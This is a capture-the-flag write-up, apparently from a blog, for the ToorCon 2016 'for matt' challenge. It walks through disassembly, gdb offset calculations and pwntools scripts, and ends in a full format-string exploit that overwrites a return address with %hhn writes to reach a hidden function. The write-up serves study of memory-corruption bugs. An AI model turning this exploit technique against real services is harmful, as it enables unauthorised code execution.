---
layout: post
title: "for matt"
---

# for matt - toorcon ctf 2016

  We are told that there exists a vulnerability in the given executable and it's running at a given ip and port number. I had a feeling from the name of the challenge it was a format string bug.

  To use format string vulnerabilities one should note that the `printf` family of functions takes a variable number of arguments and cannot expect the number of arguments passed prior to being called. It uses the format string to evaluate how many arguments are passed and where on the stack they exist. Therefore if user controlled input is provided to it directly (without using a format specifier) then an attacker can read and write arbitrary memory locations.

  Echo is our vulnerable function with user input being passed directly to `sprintf`:

```
[0x080486b0]> pdf@sym.echo
╒ (fcn) sym.echo 236
│   sym.echo ();
│           ; var int local_412h @ ebp-0x412
│           ; var int local_20ch @ ebp-0x20c
│           ; var int local_ch_2 @ ebp-0xc
│           ; var int local_4h @ esp+0x4
│           ; var int local_8h @ esp+0x8
│           ; var int local_ch @ esp+0xc
│           ; CALL XREF from 0x08048b18 (sym.main)
│           0x0804880a      55             push ebp
│           0x0804880b      89e5           mov ebp, esp
│           0x0804880d      81ec28040000   sub esp, 0x428
│           0x08048813      c74424080002.  mov dword [esp + local_8h], 0x200 
│           0x0804881b      c74424040000.  mov dword [esp + local_4h], 0
│           0x08048823      8d85f4fdffff   lea eax, [ebp - local_20ch]
│           0x08048829      890424         mov dword [esp], eax
│           0x0804882c      e81ffeffff     call sym.imp.memset
│           0x08048831      c74424080602.  mov dword [esp + local_8h], 0x206 
│           0x08048839      c74424040000.  mov dword [esp + local_4h], 0
│           0x08048841      8d85eefbffff   lea eax, [ebp - local_412h]
│           0x08048847      890424         mov dword [esp], eax
│           0x0804884a      e801feffff     call sym.imp.memset
│           ; LEA obj.comm_fd ; "ed Hat 4.8.3-9)" @ 0x8049fe8
│           0x0804884f      a1e89f0408     mov eax, dword [obj.comm_fd]
│           0x08048854      c744240c0000.  mov dword [esp + local_ch], 0
│           0x0804885c      c74424080002.  mov dword [esp + local_8h], 0x200 
│           0x08048864      8d95f4fdffff   lea edx, [ebp - local_20ch]
│           0x0804886a      89542404       mov dword [esp + local_4h], edx
│           0x0804886e      890424         mov dword [esp], eax
│           0x08048871      e81afeffff     call sym.imp.recv
│           0x08048876      8945f4         mov dword [ebp - local_ch_2], eax
│           0x08048879      8b45f4         mov eax, dword [ebp - local_ch_2]
│           0x0804887c      89442404       mov dword [esp + local_4h], eax
│           ; LEA str.Recv:__d_n ; "Recv: %d." @ 0x8048c49
│           0x08048880      c70424498c04.  mov dword [esp], str.Recv:__d_n
│           0x08048887      e8e4fcffff     call sym.imp.printf
│           0x0804888c      837df400       cmp dword [ebp - local_ch_2], 0
│       ┌─< 0x08048890      7e5f           jle 0x80488f1
│       │   0x08048892      8d85eefbffff   lea eax, [ebp - local_412h]
│       │   0x08048898      c70052454356   mov dword [eax], 0x56434552 
│       │   0x0804889e      66c740043a00   mov word [eax + 4], 0x3a    
│       │   0x080488a4      8d85f4fdffff   lea eax, [ebp - local_20ch]
│       │   0x080488aa      89442404       mov dword [esp + local_4h], eax
│       │   0x080488ae      8d85eefbffff   lea eax, [ebp - local_412h]
│       │   0x080488b4      83c005         add eax, 5
│       │   0x080488b7      890424         mov dword [esp], eax
│       │   0x080488ba      e8b1fdffff     call sym.imp.sprintf
│       │   0x080488bf      8d85eefbffff   lea eax, [ebp - local_412h]
│       │   0x080488c5      890424         mov dword [esp], eax
│       │   0x080488c8      e853fdffff     call sym.imp.strlen
│       │   ; LEA obj.comm_fd ; "ed Hat 4.8.3-9)" @ 0x8049fe8
│       │   0x080488cd      8b15e89f0408   mov edx, dword [obj.comm_fd]
│       │   0x080488d3      c744240c0000.  mov dword [esp + local_ch], 0
│       │   0x080488db      89442408       mov dword [esp + local_8h], eax
│       │   0x080488df      8d85eefbffff   lea eax, [ebp - local_412h]
│       │   0x080488e5      89442404       mov dword [esp + local_4h], eax
│       │   0x080488e9      891424         mov dword [esp], edx
│       │   0x080488ec      e8affdffff     call sym.imp.send
│       └─> 0x080488f1      8b45f4         mov eax, dword [ebp - local_ch_2]
│           0x080488f4      c9             leave
╘           0x080488f5      c3             ret
[0x080486b0]>
```

  I had to find the offset needed to leak the return address so that we could write in the address of the secretFunction. I calculated the return address from the saved ebp (since `%n` takes a pointer, we need the return address's address on the stack) which I was able to leak by calculating the distance from the end of our input buffer.

  Observe the size of our buffer in the disassembly for the echo function; buf is where are our input is.

```
.text:0804880A buf             = byte ptr -412h
.text:0804880A s               = byte ptr -20Ch
.text:0804880A var_C           = dword ptr -0Ch
```

  I leaked the address with what is called direct parameter access by some and the 'dollar sign trick' by others. The idea is you can use a format specifier like so: `%2$08x` to print the second argument to `printf` in hex, padded to a length of eight with zeroes. When finding the index to the saved ebp I used the size of our buffer divided by 4, since each stack entry holds 4 bytes. 

```
gef➤  p/d 0x412
$1 = 1042
gef➤  p/d 1042 / 4
$2 = 260 
gef➤
```

 Finding the index for the saved ebp was straightforward after getting past our huge buf variable, I made note of the address echo returns to; `0x80488b1d` and ran a program like the following.

% highlight python %
#!/usr/bin/python

from pwn import *

r = remote('localhost', 6600)
log.info(r.recv())

for i in range(260, 270):
        r.send("%{}$08x".format(str(i)))
        r.recvuntil("RECV:")
        log.info("i = {}: {}".format(str(i), r.recv()))

r.close()
% endhighlight %

```
➜  ~ python getebp.py
[+] Opening connection to localhost on port 6600: Done
[*] hello speedracers...
[*] i = 260: 00000000
[*] i = 261: 00000000
[*] i = 262: 00000011
[*] i = 263: f76d9000
[*] i = 264: ffc75d10
[*] i = 265: ffc75d68 <-- saved ebp
[*] i = 266: 08048b1d
[*] i = 267: 00000005
[*] i = 268: 08048d1b
[*] i = 269: 00000015
[*] Closed connection to localhost port 6600
```

 While running the program in gdb and making note of the saved ebp (`0xffffd658` in the following example) one can deduce the offset for the stack address address where the return address is saved. In the following example you see the top of the stack when eip is at `0x0804880b` (echo subroutine).

```
0xffffd5f8│+0x0000: 0xffffd658  →  0x0   ← $esp
0xffffd5fc│+0x0004: 0x08048b1d  →  <main+551>: mov DWORD PTR [esp+0x4c],eax
```

 Now I could calculate the offset to get the return address.

```
gef➤  p/x 0xffffd658 - 0xffffd5f8  <-- from main's stack frame to echo's
$2 = 0x60
gef➤  x/xw 0xffffd658 - 0x60 + 4   <-- return address :)
0xffffd5fc:     0x08048b1d
gef➤
```

 My plan was to conveniently place the pointer to the return address at the beginning of the input and pass the address to `printf` with direct parameter access. To find the necassary index I wrote some python like we did for ebp.

% highlight python %
#!/usr/bin/python

from pwn import *

r = remote('localhost', 6600)
log.info(r.recv())

for i in range(0, 150):
        r.send("AAAA%{}$08x".format(str(i)))
        r.recvuntil("RECV:")
        recieved =  r.recv()
        log.info("i = {}: {}".format(str(i), recieved))
        if '41414141' in recieved:
                success("i = {}: {}".format(str(i), recieved))
                break

r.close()
% endhighlight %

 The script above, when run; shows that the index to our input is 134

 To overwrite echo's return address we need only to write the 2 least significant bytes since echo's return address is `0x8048b1d` and the address of the secretFunction is `0x80487b0`. We can calculate the number of bytes we have to print in order to write the secretFunction address to the return address by simply converting the two desired bytes to decimal.

```
gef➤  p/d 0x87
$1 = 135
gef➤  p/d 0xb0
$2 = 176
gef➤
```

 Thus we calculated the format string in python

```
p32(raplus1) + p32(return_addr)\
+ "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 143 + 8) + "%135$hhn"
```

 Where the 143 + 8 is needed to offset the bytes written for one byte prior to writing the other byte.

```
➜  ~ python pwn66600.py
[+] Opening connection to eric.32774074faceba7c.ctf.land on port 6600: Done
[*] found RA @ ffd0534c
[*] Switching to interactive mode
RECV:MSLSA ..<alot of A>.. A$ SpacesInsteadOfTabs?!
```
## full exploit:

% highlight python %
#!/usr/bin/python

from pwn import *

# 134 is our input str
# 265 is our saved ebp

# RA is @ saved ebp - 0x60 + 0x4

# read out & save saved ebp
# calculate address of RA
# write this address at the beginning of
# the string and write with secret functions addr 

r = remote('eric.32774074faceba7c.ctf.land', 6600)
r.send("%265$08x")
r.recvuntil("RECV:")
saved_ebp = pack(u32(r.recv().decode('hex')), 32, "big")

return_addr = u32(saved_ebp) - 0x60 + 4
raplus1 = u32(saved_ebp) - 0x60 + 4 + 1

log.info("found RA @ {:x}".format(return_addr))

r.send(p32(raplus1) + p32(return_addr) \
        + "A" * (135 - 8) + "%134$hhn" \
        + "A" * (176 - 143 + 8) \
        + "%135$hhn")
        # first one is 0x87, second one is 0xb0

r.interactive()

r.close()
% endhighlight %

